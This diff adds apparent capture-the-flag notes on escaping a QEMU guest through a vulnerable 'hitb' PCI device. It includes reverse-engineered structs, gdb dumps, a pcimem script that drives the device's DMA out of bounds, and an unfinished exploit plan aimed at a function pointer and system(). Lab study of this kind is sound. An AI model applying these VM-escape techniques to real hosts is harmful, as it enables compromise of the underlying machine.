@@ -1,0 +1,402 @@
+gdb-peda$ checksec
+CANARY    : ENABLED
+FORTIFY   : ENABLED
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : FULL
+
+# cat /sys/devices/pci0000\:00/0000\:00\:04.0/resource
+0x00000000fea00000 0x00000000feafffff 0x0000000000040200
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+
+# pcimem /sys/devices/pci0000\:00/0000\:00\:04.0/resource0 0x100 d 0xb00bface
+/sys/devices/pci0000:00/0000:00:04.0/resource0 opened.
+Target offset is 0x100, page size is 4096
+mmap(0, 4096, 0x3, 0x1, 3, 0x100)
+PCI Memory mapped to address 0x7fecadd3e000.
+Value at offset 0x100 (0x7fecadd3e100): 0xFFFFFFFFFFFFFFFF
+
+
+opaque pointer is just a pointer without a type. it is typecasted in the mmio_write() and mmio_read() functions!
+eg)
+```
+static uint64_t
+pci_helloworld_dev_mmio_read(void *opaque, hwaddr addr, unsigned size)
+{
+    PCIHelloWorldDevState *d = opaque;
+
+```
+```
+static void
+pci_helloworld_dev_mmio_write(void *opaque, hwaddr addr, uint64_t val,
+                       unsigned size)
+{
+
+   PCIHelloWorldDevState *d = opaque;
+```
+
+```
+00000000 HitbState       struc ; (sizeof=0x1BD0, align=0x10, copyof_1493)
+00000000                                         ; XREF: hitb_mmio_write:loc_5555557D83B0/o
+00000000 pdev            PCIDevice_0 ?
+000009F0 mmio            MemoryRegion_0 ?
+00000AF0 thread          QemuThread_0 ?
+00000AF8 thr_mutex       QemuMutex_0 ?
+00000B20 thr_cond        QemuCond_0 ?
+00000B50 stopping        db ?
+00000B51                 db ? ; undefined
+00000B52                 db ? ; undefined
+00000B53                 db ? ; undefined
+00000B54 addr4           dd ?
+00000B58 fact            dd ?
+00000B5C status          dd ?
+00000B60 irq_status      dd ?
+00000B64                 db ? ; undefined
+00000B65                 db ? ; undefined
+00000B66                 db ? ; undefined
+00000B67                 db ? ; undefined
+00000B68 dma             dma_state ?             ; XREF: hitb_mmio_write:mov_into_b80/w
+	00000000 src             dq ?                    ; XREF: hitb_mmio_write+27D/w
+	00000008 dst             dq ?                    ; XREF: hitb_mmio_write+EA/w
+	00000010 cnt             dq ?                    ; XREF: hitb_mmio_write+1DD/w
+	00000018 cmd             dq ?                    ; XREF: hitb_mmio_write:set_dma_cmd/w
+00000B88 dma_timer       QEMUTimer_0 ?
+00000BB8 dma_buf         db 4096 dup(?)
+00001BB8 enc             dq ?                    ; offset
+00001BC0 dma_mask        dq ?
+00001BC8                 db ? ; undefined
+00001BC9                 db ? ; undefined
+00001BCA                 db ? ; undefined
+00001BCB                 db ? ; undefined
+00001BCC                 db ? ; undefined
+00001BCD                 db ? ; undefined
+00001BCE                 db ? ; undefined
+00001BCF                 db ? ; undefined
+00001BD0 HitbState       ends
+```
+```
+00000000 dma_state       struc ; (sizeof=0x20, align=0x8, copyof_1491)
+00000000                                         ; XREF: HitbState/r
+00000000 src             dq ?                    ; XREF: hitb_mmio_write+27D/w
+00000008 dst             dq ?                    ; XREF: hitb_mmio_write+EA/w
+00000010 cnt             dq ?                    ; XREF: hitb_mmio_write+1DD/w
+00000018 cmd             dq ?                    ; XREF: hitb_mmio_write:set_dma_cmd/w
+00000018                                         ; hitb_mmio_write:loc_5555557D8370/r
+00000020 dma_state       ends
+```
+
+```
+cpu_physical_memory_rw(opaque->dma.dst, v3, opaque->dma.cnt, 1);
+
+void cpu_physical_memory_rw(hwaddr addr, uint8_t *buf, int len, int is_write)
+{
+    address_space_rw(&address_space_memory, addr, MEMTXATTRS_UNSPECIFIED, buf, len, is_write);
+}
+```
+
+hitb_mmio_write(opaque, addr, val, size) - 0x55555873d570, 0x100, 0xb00bface, 0x4
+========================================
+void *opaque - 0x55555873d570
+addr - 0x100
+val  - 0xb00bface
+size - dword (4)
+
+
+HitbState *hitb = opaque;
+
+
+check to see if `hitb->dma->cmd == 1` 
+
+
+hitb_dma_timer(opaque) - 0x55555873d570
+================
+((void (__fastcall *)(uint8_t *, _QWORD))opaque->enc)(v7, LODWORD(opaque->dma.cnt));
+
+
+hitb_enc(buf, len) - 0x5556586fe128, 0x0
+
+
+
+hitb->dma;
+--------------
+gdb-peda$ x/20xg 0x55555873d570+0xb68
+0x55555873e0d8: 0x0000000000000000      0x0000000000000000
+0x55555873e0e8: 0x0000000000000000      0x0000000000000000
+0x55555873e0f8: 0xffffffffffffffff      0x00005555565e1830
+0x55555873e108: 0x00005555557d8090      0x000055555873d570
+0x55555873e118: 0x0000000000000000      0x00000000000f4240
+
+hitb->enc:
+----------
+gdb-peda$ telescope 0x55555873d570+0x1bb8 1
+0000| 0x55555873f128 --> 0x5555557d7dd0 (<hitb_enc>:    test   esi,esi)
+
+system:
+-------
+0x000555555751B18
+
+
+hitb->buf:
+----------
+gdb-peda$ x/50xg 0x55555873d570+0xbb8
+0x55555873e128: 0x0000000000000000      0x0000000000000000
+0x55555873e138: 0x0000000000000000      0x0000000000000000
+0x55555873e148: 0x0000000000000000      0x0000000000000000
+0x55555873e158: 0x0000000000000000      0x0000000000000000
+0x55555873e168: 0x0000000000000000      0x0000000000000000
+0x55555873e178: 0x0000000000000000      0x0000000000000000
+0x55555873e188: 0x0000000000000000      0x0000000000000000
+0x55555873e198: 0x0000000000000000      0x0000000000000000
+0x55555873e1a8: 0x0000000000000000      0x0000000000000000
+0x55555873e1b8: 0x0000000000000000      0x0000000000000000
+0x55555873e1c8: 0x0000000000000000      0x0000000000000000
+0x55555873e1d8: 0x0000000000000000      0x0000000000000000
+0x55555873e1e8: 0x0000000000000000      0x0000000000000000
+0x55555873e1f8: 0x0000000000000000      0x0000000000000000
+
+
+EXPLOIT
+========
+set dma.cnt >= 0x1000
+
+```
+#!/bin/sh
+
+pcimem /sys/devices/pci0000\:00/0000\:00\:04.0/resource0 0x80 d 0x41000     # set dma.src=0x41000
+pcimem /sys/devices/pci0000\:00/0000\:00\:04.0/resource0 0x90 d 0x40        # set dma.cnt=0x40 
+pcimem /sys/devices/pci0000\:00/0000\:00\:04.0/resource0 0x98 d 0xb00bfacf  # call hitb_dma_timer()
+```
+
+
+`address_space_rw(&address_space_memory, dest, one, dma_buf_offset, len_, is_write != 0);`
+
+```
+gdb-peda$ context
+[----------------------------------registers-----------------------------------]
+RAX: 0xb00bfac3
+RBX: 0x55555873d570 --> 0x5555565ac160 --> 0x5555565554a0 --> 0x55555652a9f0 --> 0x7f0062746968
+RCX: 0x1  
+RDX: 0x10 
+RSI: 0x55555873e228 ("BBBBBBBBCCCCCCCC")
+RDI: 0x55555873e128 --> 0x0
+RBP: 0x5555565e1838 --> 0x0
+RSP: 0x7fffffffd990 --> 0x5555565e1830 --> 0x5555565234c0 --> 0x5555565e2740 (0x00005555565234c0)
+RIP: 0x5555557d80d6 (<hitb_dma_timer+70>:       call   0x555555763070 <cpu_physical_memory_rw>)
+R8 : 0x0  
+R9 : 0x23c393d120d
+R10: 0xffffffffff7ff000
+R11: 0x2  
+R12: 0x5555557d8090 (<hitb_dma_timer>:  mov    rax,QWORD PTR [rdi+0xb80])
+R13: 0x23f437385bc
+R14: 0x5555565e1888 --> 0x1
+R15: 0x55555873d570 --> 0x5555565ac160 --> 0x5555565554a0 --> 0x55555652a9f0 --> 0x7f0062746968
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x5555557d80c4 <hitb_dma_timer+52>:  mov    edx,DWORD PTR [rbx+0xb78]
+   0x5555557d80ca <hitb_dma_timer+58>:  mov    rdi,QWORD PTR [rbx+0xb70]
+   0x5555557d80d1 <hitb_dma_timer+65>:  mov    ecx,0x1
+=> 0x5555557d80d6 <hitb_dma_timer+70>:  call   0x555555763070 <cpu_physical_memory_rw>
+   0x5555557d80db <hitb_dma_timer+75>:  mov    rax,QWORD PTR [rbx+0xb80]
+   0x5555557d80e2 <hitb_dma_timer+82>:  mov    rdx,rax
+   0x5555557d80e5 <hitb_dma_timer+85>:  and    edx,0x4
+   0x5555557d80e8 <hitb_dma_timer+88>:  and    rax,0xfffffffffffffffe
+Guessed arguments:
+arg[0]: 0x55555873e128 --> 0x0
+arg[1]: 0x55555873e228 ("BBBBBBBBCCCCCCCC")
+arg[2]: 0x10
+arg[3]: 0x1
+```
+
+
+```
+static MemTxResult flatview_write_continue(FlatView *fv, hwaddr addr,
+                                           MemTxAttrs attrs,
+                                           const uint8_t *buf,
+                                           int len, hwaddr addr1,
+                                           hwaddr l, MemoryRegion *mr)
+{
+    uint8_t *ptr;
+    uint64_t val;
+    MemTxResult result = MEMTX_OK;
+    bool release_lock = false;
+
+    for (;;) {
+        if (!memory_access_is_direct(mr, true)) {
+            release_lock |= prepare_mmio_access(mr);
+            l = memory_access_size(mr, l, addr1);
+            /* XXX: could force current_cpu to NULL to avoid
+               potential bugs */
+            switch (l) {
+            case 8:
+                /* 64 bit write access */
+                val = ldq_p(buf);
+                result |= memory_region_dispatch_write(mr, addr1, val, 8,
+                                                       attrs);
+                break;
+            case 4:
+                /* 32 bit write access */
+                val = (uint32_t)ldl_p(buf);
+                result |= memory_region_dispatch_write(mr, addr1, val, 4,
+                                                       attrs);
+                break;
+            case 2:
+                /* 16 bit write access */
+                val = lduw_p(buf);
+                result |= memory_region_dispatch_write(mr, addr1, val, 2,
+                                                       attrs);
+                break;
+            case 1:
+                /* 8 bit write access */
+                val = ldub_p(buf);
+                result |= memory_region_dispatch_write(mr, addr1, val, 1,
+                                                       attrs);
+                break;
+            default:
+                abort();
+            }
+        } else {
+            /* RAM case */
+            ptr = qemu_ram_ptr_length(mr->ram_block, addr1, &l, false);
+            memcpy(ptr, buf, l);
+            invalidate_and_set_dirty(mr, addr1, l);
+        }
+```
+
+```
+/* Called within RCU critical section.  */
+MemTxResult flatview_read_continue(FlatView *fv, hwaddr addr,
+                                   MemTxAttrs attrs, uint8_t *buf,
+                                   int len, hwaddr addr1, hwaddr l,
+                                   MemoryRegion *mr)
+{
+    uint8_t *ptr;
+    uint64_t val;
+    MemTxResult result = MEMTX_OK;
+    bool release_lock = false;
+
+    for (;;) {
+        if (!memory_access_is_direct(mr, false)) {
+            /* I/O case */
+            release_lock |= prepare_mmio_access(mr);
+            l = memory_access_size(mr, l, addr1);
+            switch (l) {
+            case 8:
+                /* 64 bit read access */
+                result |= memory_region_dispatch_read(mr, addr1, &val, 8,
+                                                      attrs);
+                stq_p(buf, val);
+                break;
+            case 4:
+                /* 32 bit read access */
+                result |= memory_region_dispatch_read(mr, addr1, &val, 4,
+                                                      attrs);
+                stl_p(buf, val);
+                break;
+            case 2:
+                /* 16 bit read access */
+                result |= memory_region_dispatch_read(mr, addr1, &val, 2,
+                                                      attrs);
+                stw_p(buf, val);
+                break;
+            case 1:
+                /* 8 bit read access */
+                result |= memory_region_dispatch_read(mr, addr1, &val, 1,
+                                                      attrs);
+                stb_p(buf, val);
+                break;
+            default:
+                abort();
+            }
+        } else {
+            /* RAM case */
+            ptr = qemu_ram_ptr_length(mr->ram_block, addr1, &l, false);
+            memcpy(buf, ptr, l);
+        }
+
+```
+
+```
+void cpu_physical_memory_rw(hwaddr addr, uint8_t *buf,
+                            int len, int is_write)
+{
+    address_space_rw(&address_space_memory, addr, MEMTXATTRS_UNSPECIFIED,
+                     buf, len, is_write);
+}
+
+[...]
+
+MemTxResult address_space_rw(AddressSpace *as, hwaddr addr, MemTxAttrs attrs,
+                             uint8_t *buf, int len, bool is_write)
+{
+    if (is_write) {
+        return address_space_write(as, addr, attrs, buf, len);
+    } else {
+        return address_space_read_full(as, addr, attrs, buf, len);
+    }
+}
+
+[...]
+
+MemTxResult address_space_write(AddressSpace *as, hwaddr addr,
+                                MemTxAttrs attrs,
+                                const uint8_t *buf, int len)
+{
+    MemTxResult result = MEMTX_OK;
+    FlatView *fv;
+
+    if (len > 0) {
+        rcu_read_lock();
+        fv = address_space_to_flatview(as);
+        result = flatview_write(fv, addr, attrs, buf, len);
+        rcu_read_unlock();
+    }
+
+    return result;
+}
+
+[...]
+
+MemTxResult address_space_read_full(AddressSpace *as, hwaddr addr,
+                                    MemTxAttrs attrs, uint8_t *buf, int len)
+{
+    MemTxResult result = MEMTX_OK;
+    FlatView *fv;
+
+    if (len > 0) {
+        rcu_read_lock();
+        fv = address_space_to_flatview(as);
+        result = flatview_read(fv, addr, attrs, buf, len);
+        rcu_read_unlock();
+    }
+
+    return result;
+}
+
+[...]
+
+/* Called from RCU critical section.  */
+static MemTxResult flatview_read(FlatView *fv, hwaddr addr,
+                                 MemTxAttrs attrs, uint8_t *buf, int len)
+{
+    hwaddr l;
+    hwaddr addr1;
+    MemoryRegion *mr;
+
+    l = len;
+    mr = flatview_translate(fv, addr, &addr1, &l, false);
+    return flatview_read_continue(fv, addr, attrs, buf, len,
+                                  addr1, l, mr);
+}
+
+```
+
+EXPOIT PLAN
+===========
+1) mmap a DMA buffer in userspace program
+2) copy contents of DMA buffer to 
+
+
+
+iomem @ 0x7f7830847000
+DMA buffer (virt) @ 0x7f7830846000
+DMA buffer (phys) @ 0x3f42000
